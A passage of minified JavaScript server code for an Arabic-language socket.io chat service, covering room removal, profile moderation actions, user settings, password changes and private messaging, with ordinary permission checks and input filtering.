            }).catch(e => {})
        }
    }, i.prototype.removeRoom = function(e) {
        if (e && e.room.id) {
            const s = this.store.rooms.all().filter(t => t.id == e.room.id)[0];
            if (!s || s.removeWhenEmpty) return;
            if (s.default) return this.handler(r.enc({
                error: !0,
                message: "لا يمكن حذف هذه الغرفة"
            }));
            if (!this.user.can("room_remove", this.handler)) return;
            var t = this.store.rooms.remove(s.id);
            t && this.store.io.emit("res", r.enc({
                type: "ADMIN_ROOM_DELETED",
                data: {
                    ids: [t]
                }
            })), this.handler(r.enc({
                error: !1
            })), this.store.rooms.remvoeFromDB(s.id).catch(e => {}), this.register(s.name, "remove")
        }
    }, i.prototype.publishAddedRoom = function(e) {
        this.store.users.forEach(t => {
            t.socket.emit("res", r.enc({
                type: "NEW_ROOM_CREATED",
                data: {
                    room: e.parse(t, this.store.users)
                }
            }))
        })
    }, i.prototype.register = function(e, t) {
        const s = this;
        return new Promise((r, i) => {
            s.store.db.query("INSERT INTO roomsReg (byRealName, byNickName, roomName, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?)", [s.user.name, s.user.getUsername(), e, t, new Date, new Date], (e, t) => {
                e && i(e), r(t)
            })
        })
    }, i.prototype.botBrbRemoveParticipant = function(e) {
        e.botBrbExcpel = !1;
        let t = this.store.bots_brb.filter(t => t.room_id == e.room.id)[0];
        t && t.removeParticipant(e)
    }, i.prototype.isUserMuted = function() {
        return !!this.user.isMuted || this.store.mutedIps.indexOf(this.user.ip) >= 0 || this.store.mutedDevices.indexOf(this.user.device) >= 0
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0),
        i = s(11);

    function o(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "PROFILE_SHOW":
                return this.getProfile(e.data);
            case "PROFILE_ACTION_NOTIFY":
                return this.notify(e.data);
            case "PROFILE_ACTION_LIKE":
                return this.like(e.data);
            case "PROFILE_ACTION_GET_ALBUM":
                return this.getAlbum(e.data);
            case "PROFILE_REFRESH_ALBUM":
                return this.refreshAlbum(e.data);
            case "PROFILE_LIKE_ALBUM_PHOTO":
                return this.likeAlbumPhoto(e.data);
            case "PROFILE_REMOVE_ALBUM_PHOTO":
                return this.removeAlbumPhoto(e.data);
            case "PROFILE_ACTION_GIFT":
                return this.gift(e.data);
            case "PROFILE_ACTION_REMOVE_GIFT":
                return this.removeGift(e.data);
            case "PROFILE_ACTION_REMOVE_AVATAR":
                return this.removeAvatar(e.data);
            case "PROFILE_ACTION_REVEAL_NAMES":
                return this.revealNames(e.data);
            case "PROFILE_ACTION_CHANGE_DECORATION":
                return this.changeDecoration(e.data);
            case "PROFILE_ACTION_CONTROL_LIKES":
                return this.controlLikes(e.data);
            case "PROFILE_ACTION_ROOM_EXCPEL":
                return this.roomExcpel(e.data);
            case "PROFILE_ACTION_CANCEL_RADIO":
                return this.cancelRadio(e.data);
            case "PROFILE_ACTION_EXCPEL":
                return this.excpel(e.data);
            case "PROFILE_ACTION_BAN":
                return this.ban(e.data);
            case "PROFILE_ACTION_MUTE":
                return this.mute(e.data);
            case "PROFILE_ACTION_UNMUTE":
                return this.unmute(e.data);
            case "PROFILE_ACTION_CHANGE_ROOM":
                return this.changeRoom(e.data);
            case "PROFILE_ACTION_CHANGE_ROLE":
                return this.changeRole(e.data);
            case "PROFILE_ACTION_CHANGE_SUBSCRIPTION_END":
                return this.changeSubscriptionEnd(e.data);
            case "PROFILE_ACTION_REG_USER_EVENTS":
                return this.regUserEvents(e.data);
            default:
                return null
        }
    }
    o.prototype.findUser = function(e) {
        return this.store.users.filter(t => t.id == e)[0] || this.store.usersReg.filter(t => t.id == e)[0]
    }, o.prototype.getProfile = function(e) {
        const t = this.findUser(e.id);
        if (t && this.user.botBrbExcpel) return this.user.botBrbExcpel = !1, this.roomExcpel(e, !0);
        if (t && t.canBeSeenBy(this.user)) {
            const s = t.likes.includes(this.user.ip);
            if (e.force) {
                const e = this.store.roles.all(this.store.permissions.getUpgradableRoles(this.user.role));
                return this.handler(r.enc({
                    user: t.parse("lg"),
                    actions: this.user.actions(),
                    roles: e,
                    liked: s
                }))
            }
            return this.handler(r.enc({
                likes: t.parse().likes,
                liked: s
            }))
        }
        return this.handler(r.enc({
            user: null
        }))
    }, o.prototype.notify = function(e) {
        const t = this.store.settings.get("required_likes_notify", this.user.getDomain());
        if (this.user.getReputation() < t) return this.handler(r.enc("يجب أن تتوفر على " + t + " إعجاب حتى تتمكن من القيام بهذه العملية"));
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        if (e.message = r.sanitize(e.message, this.store.shortcuts), !this.user.can("orders_notify", this.handler)) return;
        const s = this.findUser(e.id);
        if (s) {
            if (s.isNotificationsDisabled && !this.user.isGreaterThan(s)) return this.handler(r.enc("لا يمكنك تنبيه هذا الشخص"));
            if (!this.isUserMuted()) {
                const t = {
                    user: this.user.parse(),
                    message: e.message
                };
                s.socket && s.socket.connected ? s.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_NOTIFY",
                    data: t
                })) : s.isGuest() || (t.targetUser = s.reg_id, this.store.notifications.push(t))
            }
            this.store.db.query("INSERT INTO notificationsReg (byRealName, byNickName, toRealName, toNickName, msg, created_at, updated_at) VALUES (?,?,?,?,?,?,?)", [this.user.name, this.user.getUsername(), s.name, s.getUsername(), e.message, new Date, new Date], (e, t) => {})
        }
    }, o.prototype.like = function(e) {
        const t = this.findUser(e.id);
        if (t && t.like(this.user.ip)) {
            if (!this.isUserMuted()) {
                const e = {
                    user: this.user.parse()
                };
                t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_LIKE",
                    data: e
                }))
            }
            this.handler(r.enc(!0))
        }
    }, o.prototype.getAlbum = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (t.isGuest()) return this.handler(r.enc("الزوار ليس لديهم صلاحية الألبوم"));
            var i = {
                id: t.id,
                name: t.getUsername(),
                avatar: t.getAvatar(),
                me: t.id == this.user.id
            };
            i.me ? s(12).randomBytes(16, (e, s) => {
                var o = s.toString("hex");
                this.user.updateAjaxToken(o).then(e => {
                    i.token = o, this.handler(r.enc({
                        photos: t.getAlbum().getPhotos(),
                        user: i
                    }))
                }).catch(e => {
                    console.log(e)
                })
            }) : this.handler(r.enc({
                photos: t.getAlbum().getPhotos(),
                user: i
            }))
        }
    }, o.prototype.refreshAlbum = function(e) {
        this.user.album && this.user.album.count() ? this.user.getAlbum().initPhotos() : this.user.album = new i(this.store.db, this.user.reg_id)
    }, o.prototype.likeAlbumPhoto = function(e) {
        if (e && e.user_id && e.photo_id) {
            const t = this.findUser(e.user_id);
            if (t) {
                if (!t.getAlbum().isValidPhoto(e.photo_id)) return;
                this.user.isGuest() ? this.user.photoLikes.includes(e.photo_id) || t.getAlbum().guestLikePhoto(e.photo_id).then(s => {
                    this.user.photoLikes.push(e.photo_id), this.user.id == t.id || this.isUserMuted() || t.socket.emit("res", r.enc({
                        type: "PROFILE_LIKE_ALBUM_PHOTO",
                        data: {
                            photo: s,
                            user: this.user.parse()
                        }
                    })), this.handler(r.enc(!0))
                }).catch(e => {}) : t.getAlbum().likePhoto(e.photo_id, this.user.reg_id).then(e => {
                    this.user.id == t.id || this.isUserMuted() || t.socket.emit("res", r.enc({
                        type: "PROFILE_LIKE_ALBUM_PHOTO",
                        data: {
                            photo: e,
                            user: this.user.parse()
                        }
                    })), this.handler(r.enc(!0))
                }).catch(e => {})
            }
        }
    }, o.prototype.removeAlbumPhoto = function(e) {
        e && "number" == typeof e.id && this.user.getAlbum().removePhotoById(e.id).then(e => {
            this.handler(r.enc(e))
        }).catch(e => {})
    }, o.prototype.gift = function(e) {
        const t = this.findUser(e.userID);
        if (t) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_gift", this.handler)) return;
            const s = this.store.gifts.all().filter(t => t.id == e.giftID)[0];
            if (s && t.gift != s.icon) {
                t.gift = s.icon;
                const e = {
                    user: this.user.parse(),
                    message: s.icon
                };
                t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_GIFT",
                    data: e
                })), this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            icon: t.getIcon()
                        }
                    }
                })), t.saveAttr("gift"), this.store.ordersReg.gift(this.user, t)
            }
        }
    }, o.prototype.removeGift = function(e) {
        const t = this.findUser(e.userID);
        if (t && t.gift) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_gift", this.handler)) return;
            const e = t.gift;
            t.gift = null;
            const s = {
                user: this.user.parse(),
                message: e
            };
            t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_REMOVE_GIFT",
                data: s
            })), this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: {
                        icon: t.getIcon()
                    }
                }
            })), t.saveAttr("gift"), this.store.ordersReg.removeGift(this.user, t, e)
        }
    }, o.prototype.removeAvatar = function(e) {
        const t = this.findUser(e.id);
        if (t && t.avatar) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_remove_avatar", this.handler)) return;
            t.removeAvatar();
            const e = {
                avatar: t.getAvatar()
            };
            this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: e
                }
            })), this.handler(r.enc({
                id: t.id,
                updates: e
            })), t.saveAttr("avatar"), this.store.ordersReg.removeAvatar(this.user, t)
        }
    }, o.prototype.revealNames = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("reveal_names", this.handler)) return;
            this.store.revealNames.get(t).then(e => {
                this.handler(r.enc(e))
            }).catch(e => {})
        }
    }, o.prototype.changeDecoration = function(e) {
        const t = this.findUser(e.id);
        if (t && e.decoration && e.decoration != t.getUsername()) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (this.store.wordsFilter.check(e.decoration, this.user, this.handler)) return;
            if (!this.user.can("orders_change_decoartion", this.handler)) return;
            t.decoration = r.sanitize(e.decoration);
            const s = {
                name: t.getUsername()
            };
            this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: s
                }
            })), this.handler(r.enc({
                id: t.id,
                updates: s
            })), t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_CHANGE_DECORATION",
                data: {
                    user: this.user.parse()
                }
            })), t.saveAttr("decoration"), this.store.ordersReg.changeName(this.user, t)
        }
    }, o.prototype.controlLikes = function(e) {
        const t = this.findUser(e.id);
        if (t && e.likes && e.likes != t.getReputation()) {
            if (!this.user.isGreaterThan(t) && t.id != this.user.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("like_controls", this.handler)) return;
            if (!isNaN(parseInt(e.likes))) {
                t.reputation = parseInt(e.likes) - t.likes.length;
                const s = t.getReputation(),
                    i = {
                        likes: s
                    };
                this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: i
                    }
                })), this.handler(r.enc({
                    id: t.id,
                    updates: i
                })), t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_CONTROL_LIKES",
                    data: {
                        user: this.user.parse(),
                        likes: s
                    }
                })), t.saveAttr("reputation", s), this.store.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [this.user.name, this.user.getUsername(), t.name, t.getUsername(), " تم منحه " + e.likes + " لايك ", "control-likes", new Date, new Date], (e, t) => {})
            }
        }
    }, o.prototype.roomExcpel = function(e, t) {
        const s = this.findUser(e.id);
        if (s && s.room) {
            if (!t && !this.user.isGreaterThan(s)) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!t && !this.user.can("orders_excpel_from_room", this.handler)) return;
            const e = s.room.parse();
            t || s.excpelFromRoom(s.room.id);
            const i = {
                room: null
            };
            this.store.io.emit("res", r.enc({
                type: "USER_EXPELED_FROM_ROOM",
                data: {
                    user: s.parse(),
                    oldRoom: e
                }
            })), this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: s.id,
                    reg_id: s.reg_id,
                    updates: i
                }
            })), s.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_ROOM_EXCPEL",
                data: {
                    user: this.user.parse(),
                    oldRoom: e
                }
            })), this.handler(r.enc({
                id: s.id,
                updates: i
            })), t || this.store.ordersReg.roomExcpel(this.user, s, e)
        }
    }, o.prototype.cancelRadio = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("stop_radio", this.handler, !0)) return;
            this.store.radio.getSpeaker() && this.store.radio.getSpeaker().id == e.id && (this.store.radio.stopSpeaking(this.store.radio.getSpeaker()), this.handler(r.enc(!0)))
        }
    }, o.prototype.excpel = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_excpel", this.handler)) return;
            this.store.ordersReg.excpel(this.user, t), t.socket.emit("expl"), t.excpel(this.user.parse())
        }
    }, o.prototype.ban = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_ban", this.handler)) return;
            t.ban(this.user).then(() => {
                this.store.ordersReg.ban(this.user, t), t.isGuest() || this.store.db.query("UPDATE users SET is_trusted = 0 WHERE id = ?", [t.reg_id], (e, t) => {}), t.socket.emit("ban"), t.logout()
            }).catch(e => {
                this.store.ordersReg.ban(this.user, t), t.socket.emit("ban"), t.logout()
            })
        }
    }, o.prototype.mute = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("admin_mute", this.handler, !0)) return;
            t.mute(this.user).then(() => {}).catch(e => {})
        }
    }, o.prototype.unmute = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("admin_mute", this.handler, !0)) return;
            t.unmute().then(() => {}).catch(e => {})
        }
    }, o.prototype.leaveRoom = function(e) {
        e.room && (e.room.users = e.room.users.filter(t => e.id != t)), e.room = null
    }, o.prototype.changeRoom = function(e) {
        const t = this.findUser(e.id),
            s = this.store.rooms.all().filter(t => t.id == e.roomId)[0];
        if (t && s) {
            if (!this.user.isGreaterThan(t) && this.user.id != t.id) return this.handler(r.enc("لا يمكنك القيام بهذه العملية"));
            if (!this.user.can("orders_change_room", this.handler)) return;
            const e = {
                    error: !0,
                    message: null
                },
                i = t.room;
            this.leaveRoom(t), s.users.push(this.user.id), t.room = s, this.store.users.forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "USER_JOINDED_ROOM",
                    data: {
                        user: t.parse(),
                        oldRoom: i ? i.parse(e, this.store.users) : null,
                        newRoom: s.parse(e, this.store.users)
                    }
                }))
            }), e.error = !1, e.user = this.user.parse(), e.room = s.parse(t, this.store.users), t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_CHANGE_ROOM",
                data: e
            })), this.store.users.forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            room: t.room.parse(e, this.store.users)
                        }
                    }
                }))
            }), this.store.ordersReg.orderChangeRoom(this.user, t)
        }
    }, o.prototype.changeRole = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            var s = new Date;
            if (s.setDate(s.getDate() + 30), !this.user.isGreaterThan(t)) return this.handler(r.enc("يمكنك فقط ترقية السوابر الأقل منك رتبة"));
            if (!this.user.can("orders_upgrade", this.handler)) return;
            if (!this.user.canUpgrade(t, e.roleId)) return this.handler(r.enc("لا تملك الصلاحيات للترقية إلى هذه الرتبة"));
            t.role = e.roleId;
            const i = this.store.roles.getRoleName(t.role),
                o = {
                    user: this.user.parse(),
                    roleName: i
                };
            t.socket.emit("res", r.enc({
                type: "PROFILE_ACTION_CHANGE_ROLE",
                data: o
            })), this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: {
                        subscription_end: s,
                        isSuper: t.isSuper(),
                        isOwner: t.isOwner(),
                        role: t.role,
                        power: t.getPower(),
                        icon: t.getIcon()
                    }
                }
            })), t.saveAttr("role_id", t.role), this.store.ordersReg.changeRole(this.user, t, i), this.handler(r.enc()), this.store.db.query("UPDATE users SET subscription_end = ? WHERE id = ?", [s, t.reg_id], (e, t) => {})
        }
    }, o.prototype.changeSubscriptionEnd = function(e) {
        const t = this.findUser(e.id);
        if (t) {
            var s = new Date;
            if (s.setDate(s.getDate() + e.end), !this.user.isGreaterThan(t)) return this.handler(r.enc("يمكنك فقط ترقية السوابر الأقل منك رتبة"));
            if (!this.user.can("orders_upgrade", this.handler)) return;
            this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: t.id,
                    reg_id: t.reg_id,
                    updates: {
                        subscription_end: s
                    }
                }
            })), this.handler(r.enc()), t.saveAttr("role_id", t.role), t.saveAttr("subscription_end", s)
        }
    }, o.prototype.regUserEvents = function(e) {
        const t = this.findUser(e.id);
        t && this.user.isOwner && (t.regEvents = !t.regEvents, this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: t.id,
                reg_id: t.reg_id,
                updates: {
                    regEvents: t.regEvents
                }
            }
        })), this.handler(r.enc(!0)))
    }, o.prototype.isUserMuted = function() {
        return !!this.user.isMuted || this.store.mutedIps.indexOf(this.user.ip) >= 0 || this.store.mutedDevices.indexOf(this.user.device) >= 0
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0),
        i = (s(2), s(7), s(4));

    function o(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "USER_SETTINGS_SAVE":
                return this.save(e.data);
            case "USER_SETTINGS_SET_FONT_SIZE":
                return this.setFontSize(e.data);
            case "USER_SETTINGS_REMOVE_NAME_BG_COLOR":
                return this.removeNamgeBgColor();
            case "USER_SETTINGS_HIDE_ROLE_ICON":
                return this.hideRoleIcon();
            case "USER_SETTINGS_CHANGE_AVATAR":
                return this.changeAvatar(e.data);
            case "USER_SETTINGS_REMOVE_AVATAR":
                return this.removeAvatar();
            case "USER_SETTINGS_TOGGLE_PRIVATE":
                return this.togglePrivate();
            case "USER_SETTINGS_TOGGLE_NOTIFICATIONS":
                return this.toggleNotifications();
            case "USER_SETTINGS_CHANGE_PASSWORD":
                return this.changePassword(e.data);
            case "USER_SETTINGS_SEND_AD":
                return this.sendAd(e.data);
            case "USER_SETTINGS_SET_BACKGROUND":
                return this.setUserBackground(e.data);
            case "USER_SETTINGS_REMOVE_BACKGROUND":
                return this.removeUserBackground(e.data);
            default:
                return null
        }
    }
    o.prototype.setUserBackground = function(e) {
        if (!this.user.can("user_backgrounds", this.handler)) return;
        let t = null;
        if ("background" == e.type) t = this.store.userBackgrounds.find(e.id), this.user.background = t.img, this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: {
                    background: this.user.background
                }
            }
        })), this.user.saveAttr("background");
        else {
            if ("avatar-background" != e.type) return this.handler(r.enc("حدث خطأ أثناء القيام بالعملية, الرجاء إعادة المحاولة"));
            t = this.store.userAvatarBackgrounds.find(e.id), this.user.avatar_background = t.img, this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: this.user.id,
                    reg_id: this.user.reg_id,
                    updates: {
                        avatar_background: this.user.avatar_background
                    }
                }
            })), this.user.saveAttr("avatar_background")
        }
        return t ? void 0 : this.handler(r.enc("حدث خطأ أثناء القيام بالعملية, الرجاء إعادة المحاولة"))
    }, o.prototype.removeUserBackground = function(e) {
        if ("background" == e.type) this.user.background = null, this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: {
                    background: null
                }
            }
        })), this.user.saveAttr("background");
        else {
            if ("avatar-background" != e.type) return this.handler(r.enc("حدث خطأ أثناء القيام بالعملية, الرجاء إعادة المحاولة"));
            this.user.avatar_background = null, this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: this.user.id,
                    reg_id: this.user.reg_id,
                    updates: {
                        avatar_background: null
                    }
                }
            })), this.user.saveAttr("avatar_background")
        }
    }, o.prototype.save = function(e) {
        if (this.store.wordsFilter.check(e.status, this.user, this.handler, "هذه الحالة تحتوي على كلمات ممنوعة, يرجى عدم تكرارها حتى لا يتم حظرك")) return;
        this.user.fontColor = e.fontColor = r.validateColor(e.fontColor, "#000000"), this.user.statusColor = e.statusColor = r.validateColor(e.statusColor, "#555555"), this.user.nameColor = e.nameColor = r.validateColor(e.nameColor, "#000000"), this.user.nameBgColor = e.nameBgColor = r.validateColor(e.nameBgColor, "#FFFFFF00"), this.user.decoration = e.decoration = r.sanitize(e.decoration), this.user.status = e.status = r.sanitize(e.status, this.store.shortcuts);
        const t = {
            fontColor: this.user.fontColor,
            statusColor: this.user.statusColor,
            nameColor: this.user.nameColor,
            nameBgColor: this.user.nameBgColor,
            status: this.user.getStatus(),
            name: this.user.getUsername()
        };
        this.handler(r.enc(t)), this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: t
            }
        })), this.user.save()
    }, o.prototype.setFontSize = function(e) {
        this.user.setFontSize(e.fontSize), this.handler(r.enc(this.user.fontSize)), this.user.saveAttr("fontSize")
    }, o.prototype.removeNamgeBgColor = function() {
        this.user.nameBgColor = "#FFFFFF00", this.handler(r.enc(this.user.nameBgColor)), this.user.saveAttr("nameBgColor")
    }, o.prototype.hideRoleIcon = function() {
        this.user.isRoleIconHidden = !this.user.isRoleIconHidden, this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: {
                    icon: this.user.getIcon()
                }
            }
        })), this.handler(r.enc(this.user.isRoleIconHidden)), this.user.saveAttr("isRoleIconHidden")
    }, o.prototype.changeAvatar = function(e) {
        if (r.isXSS(e.avatar)) return this.handler(r.enc(this.user.avatar));
        this.user.avatar && this.user.removeAvatar(), this.user.avatar = e.avatar;
        const t = {
            avatar: this.user.getAvatar()
        };
        this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: t
            }
        })), this.handler(r.enc(this.user.avatar)), this.user.saveAttr("avatar")
    }, o.prototype.removeAvatar = function() {
        if (this.user.avatar) {
            this.user.removeAvatar();
            const e = this.user.getAvatar(),
                t = {
                    avatar: e
                };
            this.store.io.emit("res", r.enc({
                type: "USER_UPDATED",
                data: {
                    id: this.user.id,
                    reg_id: this.user.reg_id,
                    updates: t
                }
            })), this.handler(r.enc(e)), this.user.saveAttr("avatar")
        }
    }, o.prototype.togglePrivate = function() {
        this.user.isPrivateDisabled = !this.user.isPrivateDisabled, this.handler(r.enc(this.user.isPrivateDisabled)), this.user.saveAttr("isPrivateDisabled"), this.user.isPrivateDisabled ? this.user.setState(this.user.stateEnum.NO_PRIVATE) : this.user.setState(this.user.stateEnum.ACTIVE), this.store.io.emit("res", r.enc({
            type: "USER_UPDATED",
            data: {
                id: this.user.id,
                reg_id: this.user.reg_id,
                updates: {
                    state: this.user.getState()
                }
            }
        }))
    }, o.prototype.toggleNotifications = function() {
        this.user.isNotificationsDisabled = !this.user.isNotificationsDisabled, this.handler(r.enc(this.user.isNotificationsDisabled)), this.user.saveAttr("isNotificationsDisabled")
    }, o.prototype.changePassword = function(e) {
        if (this.user.reg_id) {
            const t = {
                error: !0,
                message: "حدث خطأ أثناء القيام بالعملية"
            };
            if ("string" != typeof e.password) return this.handler(r.enc(t));
            if (e.password.length < 6) return t.message = "كلمة المرور لا يجب أن تقل عن 6 أحرف", this.handler(r.enc(t));
            const s = {
                password: e.password,
                user_id: this.user.reg_id,
                adminHash: this.store.config.adminHash
            };
            i.post(this.store.config.host + "auth/change-password", s).then(e => (t.error = !1, t.message = "تمت العملية بنجاح", this.handler(r.enc(t)))).catch(e => this.handler(r.enc(t)))
        }
    }, o.prototype.sendAd = function(e) {
        if ("string" != typeof e.message || r.isXSS(e.message)) return;
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        if (!this.user.can("send_ad", this.handler)) return;
        const t = {
            type: "NEW_AD",
            data: {
                time: Date.now(),
                user: this.user.parse(),
                message: r.sanitize(e.message, this.store.shortcuts)
            }
        };
        this.isUserMuted() ? this.store.users.filter(e => this.user.ip == e.ip).forEach(e => {
            e.socket.emit("res", r.enc(t))
        }) : this.store.users.forEach(e => {
            e.socket.emit("res", r.enc(t))
        })
    }, o.prototype.isUserMuted = function() {
        return !!this.user.isMuted || this.store.mutedIps.indexOf(this.user.ip) >= 0 || this.store.mutedDevices.indexOf(this.user.device) >= 0
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0),
        i = s(3);

    function o(e, t, s, i) {
        switch (this.socket = t, this.user = s, this.store = i, this.handler = e.handler, r.check(i, t), e.type) {
            case "NEW_PRIVATE_MESSAGE":
                return this.onNewMessage(e.data);
            case "BEFORE_SEND_MEDIA":
                return this.onBeforeSendMedia(e.data);
            case "TOGGLE_PRIVATE_BIP":
                return this.togglePrivateBip(e.data);
            case "IS_WRITING":
                return this.isWriting(e.data);
            case "PRIVATE_MESSAGE_READ":
                return this.readPrivateMessage(e.data);
            default:
                return null
        }
    }
    s(4), o.prototype.togglePrivateBip = function() {
        this.user.isPrivateBipEnabled = !this.user.isPrivateBipEnabled, this.handler(r.enc(this.user.isPrivateBipEnabled)), this.user.saveAttr("isPrivateBipEnabled")
    }, o.prototype.readPrivateMessage = function(e) {
        const t = this.findUser(e.userID);
        t && t.socket && t.socket.connected && t.socket.emit("res", r.enc({
            type: "PRIVATE_MESSAGE_READ",
            data: {
                toUser: this.user.parse()
            }
        }))
    }, o.prototype.isWriting = function(e) {
        const t = this.findUser(e.user);
        t && t.socket && t.socket.emit("res", r.enc({
            type: "IS_WRITING",
            data: {
                from: this.user.parse()
            }
        }))
    }, o.prototype.onBeforeSendMedia = function(e) {
        if (!this.canSendPrivateMessages()) return;
        if (!this.canSendMedia()) return;
        const t = this.findUser(e.id);
        if (t) {
            if (!t.socket || !t.socket.connected) return this.handler(r.enc(!1));
            if (!this.canOpenDisabledPrivate(t)) return;
            this.handler(r.enc(!0))
        } else this.handler(r.enc(!1))
    }, o.prototype.onNewMessage = function(e) {
        if (this.store.settings.get("disable_private_messages", this.user.getDomain())) return this.handler(r.enc("تم إغلاق الخاص بشكل مؤقت"));
        if (this.user.isGuest() && this.store.settings.get("disable_guest_private_messages", this.user.getDomain())) return this.handler(r.enc("الرجاء تسجيل عضوية حتى تتمكن من إستعمال الخاص"));
        if (!this.canSendPrivateMessages()) return;
        if (!this.isValidType(e.type)) return;
        if (this.user.lastMessage && this.user.lastMessage.isPrivate && Date.now() - 1e3 * this.store.settings.get("time_between_messages", this.user.getDomain()) < this.user.lastMessage.time) return;
        if (!e.message || r.isXSS(e.message)) return;
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        if ("text" == e.type) {
            const t = r.getYoutubeId(e.message);
            t && (e.type = "youtube", e.message = t)
        }
        const t = {
                id: i(),
                body: r.sanitize(e.message, this.store.shortcuts, this.store.settings.get("private_msg_length", this.user.getDomain())),
                type: e.type,
                time: Date.now(),
                read: !1,
                by: this.user.id
            },
            s = this.findUser(e.id);
        if (s) {
            if (!s.socket || s.socket.connected, !this.canOpenDisabledPrivate(s)) return;
            this.handler(r.enc(t));
            const i = {
                type: "NEW_PRIVATE_MESSAGE",
                data: {
                    from: this.user.parse(),
                    message: t
                }
            };
            this.isUserMuted() || s.socket.emit("res", r.enc(i)), s.socket && !s.socket.connected && s.privateMessages.push({
                from: this.user.parse(),
                message: t
            }), this.user.lastMessage = {
                time: Date.now(),
                isPublic: !1,
                isPrivate: !0,
                msg: e.message
            }, this.user.privateUsers.includes(s.id) || this.user.privateUsers.push(s.id)
        } else this.handler(r.enc("هذا المستخدم خارج الدردشة"))
    }, o.prototype.canSendPrivateMessages = function() {
        const e = this.store.settings.get("required_likes_private", this.user.getDomain());
        return !(this.user.getReputation() < e && (this.handler(r.enc("يجب أن تتوفر على " + e + " إعجاب حتى تتمكن من القيام بهذه العملية")), 1))
    }, o.prototype.canSendMedia = function() {
        const e = this.store.settings.get("required_likes_media", this.user.getDomain());
        return !(this.user.getReputation() < e && (this.handler(r.enc("يجب أن تتوفر على " + e + " إعجاب حتى تتمكن من القيام بهذه العملية")), 1))
